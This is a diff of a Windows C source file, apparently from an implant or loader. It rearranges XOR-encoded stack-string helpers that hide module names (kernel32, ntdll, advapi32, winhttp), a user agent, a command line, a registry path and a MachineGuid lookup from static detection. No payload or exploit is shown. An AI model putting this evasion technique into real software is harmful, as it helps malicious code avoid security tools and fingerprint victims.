@@ -3,12 +3,21 @@
 #include "wintypes.h"
 
 #define STACKSTR_KEY_KERNEL32 0x5A
-
 #define STACKSTR_KEY_NTDLL 0x3C
-
 #define STACKSTR_KEY_ADVAPI32 0xA7
-
 #define STACKSTR_KEY_WINHTTP 0x71
+#define STRLEN_BYTES_KERNEL32 24
+#define STRLEN_BYTES_WINHTTP 22
+#define STACKSTR_KEY_WIN 0x6B
+#define STACKSTR_KEY_UA 0xC3
+#define STACKSTR_KEY_CMD 0x94
+#define STACKSTR_KEY_REG 0x37
+#define STACKSTR_KEY_GUID 0x5D
+#define STACKSTR_KEY_HASH 0x4E
+#define STACKSTR_KEY_GETW 0x7A
+#define STACKSTR_KEY_GET 0x7A
+#define STACKSTR_KEY_X64 0x2D
+#define STACKSTR_KEY_X86 0xE1
 
 static VOID StrKernel32(PWCHAR buf)
 {
@@ -28,8 +37,6 @@ static VOID StrKernel32(PWCHAR buf)
     buf[12] = 0;
 }
 
-#define STRLEN_BYTES_KERNEL32 24
-
 static VOID StrNtdll(PWCHAR buf)
 {
     volatile UINT32 key = STACKSTR_KEY_NTDLL;
@@ -44,8 +51,6 @@ static VOID StrNtdll(PWCHAR buf)
     buf[8] = (WCHAR)(0x50u ^ key);
     buf[9] = 0;
 }
-
-#define STRLEN_BYTES_NTDLL 18
 
 static VOID StrAdvapi32(PWCHAR buf)
 {
@@ -65,8 +70,6 @@ static VOID StrAdvapi32(PWCHAR buf)
     buf[12] = 0;
 }
 
-#define STRLEN_BYTES_ADVAPI32 24
-
 static VOID StrWinhttp(PWCHAR buf)
 {
     volatile UINT32 key = STACKSTR_KEY_WINHTTP;
@@ -83,29 +86,6 @@ static VOID StrWinhttp(PWCHAR buf)
     buf[10] = (WCHAR)(0x1Du ^ key);
     buf[11] = 0;
 }
-
-#define STRLEN_BYTES_WINHTTP 22
-
-#define STACKSTR_KEY_WIN 0x6B
-#define STACKSTR_KEY_UA 0xC3
-#define STACKSTR_KEY_CMD 0x94
-#define STACKSTR_KEY_REG 0x37
-#define STACKSTR_KEY_GUID 0x5D
-
-static VOID StrPlatformWindows(PCHAR buf)
-{
-    volatile UINT32 key = STACKSTR_KEY_WIN;
-    buf[0] = (CHAR)(0x3Cu ^ key);
-    buf[1] = (CHAR)(0x02u ^ key);
-    buf[2] = (CHAR)(0x05u ^ key);
-    buf[3] = (CHAR)(0x0Fu ^ key);
-    buf[4] = (CHAR)(0x04u ^ key);
-    buf[5] = (CHAR)(0x1Cu ^ key);
-    buf[6] = (CHAR)(0x18u ^ key);
-    buf[7] = 0;
-}
-
-#define STRLEN_BYTES_PLATFORMWINDOWS 7
 
 static VOID StrUserAgent(PWCHAR buf)
 {
@@ -129,8 +109,6 @@ static VOID StrUserAgent(PWCHAR buf)
     buf[16] = (WCHAR)(0xF3u ^ key);
     buf[17] = 0;
 }
-
-#define STRLEN_BYTES_USERAGENT 17
 
 static VOID StrCmdline(PWCHAR buf)
 {
@@ -163,8 +141,6 @@ static VOID StrCmdline(PWCHAR buf)
     buf[25] = (WCHAR)(0xF8u ^ key);
     buf[26] = 0;
 }
-
-#define STRLEN_BYTES_CMDLINE 26
 
 static VOID StrRegPath(PCHAR buf)
 {
@@ -203,8 +179,6 @@ static VOID StrRegPath(PCHAR buf)
     buf[31] = 0;
 }
 
-#define STRLEN_BYTES_REGPATH 31
-
 static VOID StrMachineGuid(PCHAR buf)
 {
     volatile UINT32 key = STACKSTR_KEY_GUID;
@@ -221,9 +195,6 @@ static VOID StrMachineGuid(PCHAR buf)
     buf[10] = (CHAR)(0x39u ^ key);
     buf[11] = 0;
 }
-
-#define STRLEN_BYTES_MACHINEGUID 11
-#define STACKSTR_KEY_HASH 0x4E
 
 static VOID StrEnvUrl(PCHAR buf)
 {
@@ -247,7 +218,6 @@ static VOID StrCommitDefault(PCHAR buf)
     buf[7] = (CHAR)(0x7Fu ^ key);
     buf[8] = 0;
 }
-#define STACKSTR_KEY_X64 0x2D
 
 static VOID StrX64(PCHAR buf)
 {
@@ -258,8 +228,6 @@ static VOID StrX64(PCHAR buf)
     buf[3] = 0;
 }
 
-#define STACKSTR_KEY_X86 0xE1
-
 static VOID StrX86(PCHAR buf)
 {
     volatile UINT32 key = STACKSTR_KEY_X86;
@@ -269,8 +237,6 @@ static VOID StrX86(PCHAR buf)
     buf[3] = 0;
 }
 
-#define STACKSTR_KEY_GET 0x7A
-
 static VOID StrGetMethod(PCHAR buf)
 {
     volatile UINT32 key = STACKSTR_KEY_GET;
@@ -279,7 +245,6 @@ static VOID StrGetMethod(PCHAR buf)
     buf[2] = (CHAR)(0x2Eu ^ key);
     buf[3] = 0;
 }
-#define STACKSTR_KEY_GETW 0x7A
 
 static VOID StrGetMethodW(PWCHAR buf)
 {
